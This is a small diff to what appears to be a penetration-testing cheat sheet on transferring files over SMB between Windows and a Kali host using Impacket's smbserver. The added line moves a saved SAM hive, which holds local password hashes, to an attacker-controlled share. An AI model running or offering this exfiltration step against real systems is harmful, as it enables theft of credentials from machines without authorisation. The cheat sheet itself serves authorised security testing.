@@ -1396,6 +1396,7 @@ C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
 OR
 $ smbserver.py a /usr/share/windows-binaries/
 $ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support MyShare /tmp
+C:\> move sam.save \\<Attacker IP address>\MyShare
 ```
 
 - SMB Uploads WebDav (Windows -> Kali)
